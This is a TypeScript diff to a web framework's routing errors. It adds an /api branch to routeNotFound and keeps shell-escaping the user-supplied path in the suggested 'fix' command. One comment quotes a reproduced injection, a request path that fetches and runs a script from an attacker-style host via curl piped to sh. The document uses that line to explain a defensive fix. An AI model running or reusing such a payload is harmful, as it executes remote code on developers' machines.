@@ -75,6 +75,14 @@ export class HttpError extends UltimateError {
 }
 
 /**
+ * `api/` holds no route file: every path under it is an action or a query `defineApi()` mounts, so
+ * `x g route` there writes a page at a URL that still is not the endpoint. The route table lists
+ * every mounted endpoint by name, which is what a mistyped one is compared against.
+ */
+const isApiPath = (pathname: string): boolean =>
+  pathname === '/api' || pathname.startsWith('/api/');
+
+/**
  * The pathname is whatever an anonymous caller typed, and `fix:` is a COMMAND POSITION — so it
  * goes through `renderFixShellArg`, which passes an ordinary path through and substitutes a
  * placeholder for anything a shell would read. `renderFixLiteral` is the wrong tool here and
@@ -82,13 +90,24 @@ export class HttpError extends UltimateError {
  * Reproduced: `GET /$(curl -s http://evil.sh|sh)` rendered that substitution verbatim into a line
  * whose whole purpose is to be pasted into a terminal.
  */
-export const routeNotFound = (method: string, pathname: string): HttpError =>
-  new HttpError({
+export const routeNotFound = (method: string, pathname: string): HttpError => {
+  // The value itself still travels, in the field that is read rather than run.
+  const cause = `no route registered for ${method} ${pathname}`;
+  // One constructor per arm, each fix a literal beside its code: a ternary at `fix:` is unreadable
+  // to `x errors explain`'s scan, which then quoted only `x dev`'s site for this code.
+  if (isApiPath(pathname)) {
+    return new HttpError({
+      code: 'X_ROUTE_NOT_FOUND',
+      cause,
+      fix: 'x routes --json   # /api/* is an action or query mounted by defineApi() — call one it lists',
+    });
+  }
+  return new HttpError({
     code: 'X_ROUTE_NOT_FOUND',
-    // The value itself still travels, in the field that is read rather than run.
-    cause: `no route registered for ${method} ${pathname}`,
+    cause,
     fix: `x routes --json   # then: x g route ${renderFixShellArg(pathname, '<the path the cause names>')}`,
   });
+};
 
 export const methodNotAllowed = (
   method: string,
